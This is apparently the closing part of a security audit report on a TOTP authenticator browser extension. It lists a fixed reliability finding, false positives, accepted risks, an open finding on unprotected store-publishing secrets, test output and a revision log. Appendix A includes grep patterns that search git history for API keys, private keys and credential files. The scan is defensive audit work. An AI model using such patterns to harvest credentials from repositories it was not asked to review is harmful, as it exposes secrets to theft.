- Unit suite and end-to-end pass; `no uncaught exceptions in popup` check passes.

---

### SEC-015 — Base64 encoding overflowed the stack on large vaults

| Field | Value |
|---|---|
| **Severity** | Info |
| **OWASP Category** | Reliability (not an OWASP category) |
| **Status** | Fixed |
| **Location** | `src/vault.js` (`b64.enc`) |
| **Affected Version** | `1950538` and earlier |
| **Fixed In** | `1950538` |

#### Description

`String.fromCharCode(...u8)` spread the whole ciphertext into one call, which overflows the call stack past roughly 100 KB. A write of a vault with several hundred accounts failed before storage, so no data was lost, but adding accounts or importing a large desktop vault would error.

#### Evidence

```js
// Before
enc: (u8) => btoa(String.fromCharCode(...u8)),
```

#### Attack Scenario

Not a security issue; functional.

#### Remediation Applied

```js
// After
enc: (u8) => { let s = ''; for (let i = 0; i < u8.length; i += CHUNK) s += String.fromCharCode(...u8.subarray(i, i + CHUNK)); return btoa(s); },
```

**Fix rationale:** Chunked encoding has no size ceiling.

#### Verification

- Unit test `a vault far larger than one fromCharCode call round-trips` encrypts and decrypts a 3000-account model and passes.

---

## False Positives

### FP-001 — Cross-origin iframes reachable by autofill under activeTab

| Field | Value |
|---|---|
| **Initial Concern** | Two reviewers disagreed on whether `activeTab` lets `chrome.scripting` inject into cross-origin subframes, which affects the reach of SEC-001 before its fix. |
| **Verdict** | Not resolved by testing; moot after the fix |
| **Reasoning** | The end-to-end suite uses a test extension with `<all_urls>`, so production `activeTab` reach was not observed. The SEC-001 fix fills a single frame regardless, so the answer no longer changes the exposure. Documented as a limitation rather than a finding. |

### FP-002 — Prototype pollution through `__proto__` keys in an imported file

| Field | Value |
|---|---|
| **Initial Concern** | `JSON.parse` of a hostile vault could carry a `__proto__` key that spreads copy into the model. |
| **Verdict** | False Positive |
| **Reasoning** | `JSON.parse` creates `__proto__` as an own property, and object spread copies own properties without invoking the setter, so no prototype is modified. No code path assigns via `obj.__proto__` or `Object.assign` from parsed input. |

### FP-003 — Master password readable from injected page scripts

| Field | Value |
|---|---|
| **Initial Concern** | The password is cached in `chrome.storage.session`, which the injected region and autofill functions might read. |
| **Verdict** | False Positive |
| **Reasoning** | `chrome.storage.session` defaults to `TRUSTED_CONTEXTS`, which excludes content scripts and functions injected through `chrome.scripting`. The extension never raises the access level. Confirmed by the absence of any `setAccessLevel` call. |

---

## Accepted Risks

| ID | Risk | Reasoning |
|---|---|---|
| AR-001 | The master password is cached in memory-only session storage while unlocked. | Required so Chrome unloading the idle worker does not lock the user out. Session storage is cleared when the browser closes and is inaccessible to page scripts. The code notes a derived-key alternative if the vault format ever moves to a stable salt. |
| AR-002 | Codes copied to the clipboard are not cleared. | Standard authenticator behaviour; clearing would race other clipboard users. |
| AR-003 | Autofill has no origin binding, so a code filled on a phishing page is relayed. | Inherent to TOTP; the extension ranks matching accounts first but cannot verify the site. |
| AR-004 | A same-origin subframe with a focused field can outrank the top page in autofill scoring. | Such a frame already has full script access to the page it lives in, so it gains nothing new. |
| AR-006 | Password hint (0.4.0) is stored in plain text in `chrome.storage.local` and shown to anyone who opens the popup. | Required by the feature. Capped at 64 characters, may not contain the password (case-insensitive check in the worker), cleared whenever the password changes. Users are told to keep it vague. |
| AR-007 | "Start over" (0.4.0) wipes the vault from the lock screen without authentication. | Equivalent to removing the extension, which needs no password either. Behind an explicit confirmation. Destroys data but discloses nothing. |
| AR-008 | Recovery code (0.5.0) is a second credential equal in power to the master password, stored only as the password wrapped under it with the same AES-GCM/PBKDF2 codec. | 160 bits of entropy from `crypto.getRandomValues`, shown once, never stored in the clear. Recovery re-keys the vault and rotates the code. Deleted when password protection is turned off. The user is told to keep it offline. |
| AR-009 | Automatic backups (0.5.0) retain up to seven earlier encrypted envelopes, each under the password of its time. | Since 0.5.1 any key change (password on or off, recovery) clears them in the same write, so a backup is never under a key the vault has left. Within one key, a backup written in no-password mode is readable by anyone with the profile, as the vault itself is. Reset and Start over clear them. |
| AR-010 | Opt-in clock check (0.5.0) makes one GET to timeapi.io, the extension's only network request. | Off by default, stated in Settings, sends nothing but the request, no host permission needed because the service allows cross-origin reads. The offset is clamped to one day. |
| AR-011 | Clipboard clearing (0.7.0) replaces the clipboard unconditionally 30 seconds after a copy, through an offscreen page. | The worker cannot read the clipboard without a read permission that would warn users, so it cannot check what is there. The setting states this; it can be turned off. The offscreen page handles one message type and never reads. |
| AR-012 | The fill keyboard shortcut (0.7.0) fills without the popup, choosing the first account whose issuer or label appears in the hostname. | Only names of three or more characters count, and nothing is filled when no account matches. Chrome grants `activeTab` for the command, so the reach is the same as a click. The same single-frame safeguard applies. |
| AR-013 | Argon2id (0.8.0) runs as WebAssembly from a vendored hash-wasm build, which requires `wasm-unsafe-eval` in the extension-page CSP. | The build is the unmodified npm release, hash-pinned in SECURITY.md. `script-src` stays `'self'`; no inline or remote script becomes possible. The gain, GPU-resistant key derivation, outweighs the small CSP relaxation. The empty password of no-password mode is keyed as a single zero byte because the library refuses empty input; no real password can collide. |
| AR-014 | Camera scanning (0.8.0) runs in an extension tab with the webcam. | Frames are decoded locally with the same QR pipeline; the stream stops on success, cancel or leaving the page; the page needs an unlocked vault and adds through the same validated handlers as the popup. |
| AR-015 | Account icons (0.9.0) use the `favicon` permission to read Chrome's local favicon cache for a site guessed from the issuer. | The lookup is served from the browser's own database and makes no network request. The guess reveals nothing: an unknown site returns Chrome's generic icon, which the popup detects by comparison and discards. Brand marks are bundled SVG path data from a CC0 set, rendered through DOM APIs, never as markup. |
| AR-016 | A brand mark is chosen by name, so an issuer like `paypal.com.ru` draws the PayPal mark (0.9.0). | Cosmetic only: the icon carries no trust and a plain issuer of "PayPal" draws the same mark. The fill shortcut, which does matter, refuses bare names under two-level suffixes since 0.9.1. |
| AR-017 | A stored per-account site (0.10.0) is trusted by the unattended fill shortcut, including its subdomains. | It can only be set from the page a QR was scanned on, by a fill on a host the account's name already matches, or by the user typing it. A site must name one host (two or more labels, no bare suffix), so it cannot act as a wildcard. A platform host such as `github.io`, if a user types it, would match every tenant; that is the user's explicit choice. |
| AR-018 | The `idle` permission (0.11.0) lets the worker observe screen-lock and idle state. | Used only to lock the vault; it exposes nothing else and makes no request. |
| AR-019 | Sync (0.13.0) places the encrypted vault and recovery envelopes in Chrome sync, which Google stores. | Opt-in, off by default, refused without a password, removed when the password is turned off. Only ciphertext under the user's Argon2id key travels; settings, hint and password never do. Since 0.13.1 adoption is decided by an authenticated revision inside the vault (replay refused), the recovery envelope by an authenticated digest (substitution ignored), a browser never pushes over an unseen remote, and failures are shown. Someone holding the Google account can still delete the copy or block syncing, which is availability only. |
| AR-020 | Custom icons (0.13.0) are user-supplied images stored as PNG data URLs inside the vault. | Produced by the popup's own canvas from the chosen file, capped at 16 KB, validated by prefix and base64 alphabet on every write and import, rendered through an `img` element only. |
| AR-005 | Product decision after the audit (version 0.3.0, raised in 0.4.0): the master password minimum is 8 characters, and password protection can be skipped at creation or turned off in Settings, which re-encrypts the vault under the empty password. | Requested by the product owner for convenience. With protection off, anyone holding the browser profile or an exported file can read every secret, and SEC-005's mitigation is reduced. The popup warns at creation, in Settings, and on the Backup tab. Turning protection on re-keys under a new password. |

---

## Open Findings

| ID | Finding | Severity | Owner action |
|---|---|---|---|
| OF-001 | The store credentials (`AMO_JWT_*`, and `CWS_*` once created) are repository secrets, and the `firefox-add-ons` and `chrome-web-store` environments carry no protection rules or branch policy. Anyone with write access, or a stolen collaborator token, can run a workflow on any branch that reads the secrets and publishes a package. Found in pass 12. | Medium | In the repository settings: create both environments with a required reviewer and "Deployment branches: selected" limited to `main` and `v*` tags; move each secret into its environment and delete the repository-level copy. The workflow already names the environments, so no code change is needed. Until then, every publish run should be started by the owner alone. |

---

## Remediation Roadmap

| Priority | Finding ID | Title | Owner | Target Date |
|---|---|---|---|---|
| Immediate | — | Nothing outstanding | — | — |
| This Sprint | — | — | — | — |
| This Quarter | — | — | — | — |
| Backlog | AR-001 | Cache a derived non-extractable key instead of the password if the vault salt is ever made stable | Ayala Solutions | When the vault format changes |

---

## Appendix A — Raw Tool Output

### Unit tests (`npm test`, commit 2a4d35e)

```
ℹ tests 20
ℹ pass 20
ℹ fail 0
```

### End-to-end (`npm run e2e`, Chrome for Testing 154.0.8037.92, commit 2a4d35e)

```
SUMMARY 39/39 passed
```

### Vendored library verification

```
bc40c8a15196236b2314db0856f72ca0b49980cd5413b8c852a7349f5fee0859  package/dist/jsQR.js   (npm jsqr@1.4.0)
bc40c8a15196236b2314db0856f72ca0b49980cd5413b8c852a7349f5fee0859  vendor/jsQR.js
IDENTICAL
```

### npm audit

Not applicable: `package.json` declares no dependencies and the repository has no lockfile because there is nothing to lock.

### Git history secret scan

```
git log -p --all | grep -iE '(api[_-]?key|secret[_-]?key|password\s*[:=]\s*["'\''][^"'\'']{8,}|BEGIN (RSA|EC|OPENSSH) PRIVATE|sk-[A-Za-z0-9]{20})'
(no matches outside test fixtures and documented test passwords)
git log --all --name-only | grep -iE '\.env|\.pem|\.key|credentials'
(no matches)
```

---

## Appendix B — Files Reviewed

- `manifest.json`
- `package.json`
- `src/background.js`
- `src/vault.js`
- `src/totp.js`
- `src/otpauth.js`
- `src/autofill.js`
- `src/region.js`
- `src/qr.js`
- `src/categories.js`
- `src/settings.js`
- `popup/popup.html`
- `popup/popup.js`
- `popup/popup.css`
- `vendor/jsQR.js` (header inspection and hash comparison)
- `test/e2e/run.mjs` (test harness context only)
- `README.md`, `docs/VAULT-FORMAT.md` (claims checked against code)

---

## Appendix C — Revision History

| Version | Date | Author | Changes |
|---|---|---|---|
| 1.0 | 2026-09-30 | Claude Code with Ayala Solutions | Initial report covering four review passes and all remediation |
| 1.1 | 2026-09-30 | Claude Code with Ayala Solutions | AR-005 added: 6-character minimum and optional password protection introduced in 0.3.0 by product decision |
| 1.2 | 2026-09-30 | Claude Code with Ayala Solutions | AR-006 and AR-007 added: password hint and Start over introduced in 0.4.0 |
| 1.3 | 2026-10-01 | Claude Code with Ayala Solutions | AR-008 to AR-010 added: recovery code, automatic backups, opt-in clock check introduced in 0.5.0 |
| 1.4 | 2026-10-01 | Claude Code with Ayala Solutions | Sixth review pass: backups retained under an old key (Medium) and three Lows fixed in 0.5.1; AR-009 narrowed |
| 1.5 | 2026-10-01 | Claude Code with Ayala Solutions | AR-011 and AR-012 added: clipboard clearing and the fill shortcut introduced in 0.7.0 |
| 1.6 | 2026-10-01 | Claude Code with Ayala Solutions | AR-013 and AR-014 added: Argon2id over WebAssembly and camera scanning introduced in 0.8.0 |
| 1.7 | 2026-10-01 | Claude Code with Ayala Solutions | Seventh review pass on 0.8.0: PBKDF2 backups surviving the Argon2id upgrade (Medium), symbols-only hint bypass, lookalike-host shortcut fill, and non-integer indices, all fixed before release |
| 1.8 | 2026-10-01 | Claude Code with Ayala Solutions | AR-015 added: brand icons and the favicon-cache fallback introduced in 0.9.0 |
| 1.9 | 2026-10-01 | Claude Code with Ayala Solutions | Eighth review pass on 0.9.0: nothing above Low; two-level-suffix shortcut matching tightened in 0.9.1, AR-016 added |
| 2.6 | 2026-10-03 | Claude Code with Ayala Solutions | Twelfth review pass on 0.14.0 and 0.14.1 (per-browser packaging and derived manifests, the i18n move, the cloud-backup add-and-remove, the publish workflows, the category change): nothing above Medium. Two Mediums in the publish surface: release assets were trusted on a same-release hash only (fixed: a secret-free job rebuilds the tag and the zips must match byte for byte before any store job runs; the tag name is validated; `--proto =https`) and unprotected environment secrets (OF-001, owner action). Lows fixed: the Chrome job matched two zips once the Safari package existed; the reproducible build differed off UTC Linux (`touch` zone and `sort` collation now pinned; a Mac build of v0.14.1 is byte-identical to CI's); `addCategory` now re-validates name length and icon at the background boundary and rebuilds the object from allowed fields; the clipboard-clearing setting now says it is best-effort in Firefox and Safari, where the write comes from the background page; `build/` ignored. Clean: no injection sink in the i18n path (text-only setters, no HTML entities in any locale), manifests only remove permissions and keep the CSP, no cloud-backup remnant, no committed credential, secrets never reach workflow logs, actions pinned to verified commits. |
| 2.5 | 2026-10-01 | Claude Code with Ayala Solutions | Adversarial design review (Codex) of the whole day's work: two Highs reproduced and fixed in 0.13.2, an old-password browser overwriting a re-keyed synced vault, and a stored site not being authoritative for the shortcut |
| 2.4 | 2026-10-01 | Claude Code with Ayala Solutions | Eleventh review pass on 0.13.0: five Mediums and three Lows in sync (timestamp-trusting rollback, unauthenticated recovery envelope, fresh-browser overwrite, password divergence, swallowed push failures, setting-before-push, adoption off the write queue, wording), all fixed in 0.13.1; icons and Steam verified sound |
| 2.3 | 2026-10-01 | Claude Code with Ayala Solutions | 0.13.0: opt-in Chrome sync of the encrypted envelope (AR-019), custom icons (AR-020), Steam Guard |
| 2.2 | 2026-10-01 | Claude Code with Ayala Solutions | Tenth review pass on 0.12.0 (first review of 0.11.0's change-password, idle lock, importers, duplicates, CI): nothing above Low; five Lows fixed in 0.12.1 (lock during a key change, Enter on row buttons, encrypted-export detection and fractional periods, export counter timing, learn-on-fill suffix rule and platform hosts); CI verified: read-only token, pinned actions, release gated on tags |
| 2.1 | 2026-10-01 | Claude Code with Ayala Solutions | 0.11.0: change-password path, idle lock (AR-018), foreign importers through the single parser, duplicate detection, CI with pinned actions and reproducible release builds |
| 2.0 | 2026-10-01 | Claude Code with Ayala Solutions | Ninth review pass on 0.10.0: learn-on-fill binding (Medium) narrowed to name-matching hosts; bulk-import and capture-time site stamping, wildcard sites, and site-over-issuer icons fixed before release; AR-017 added |
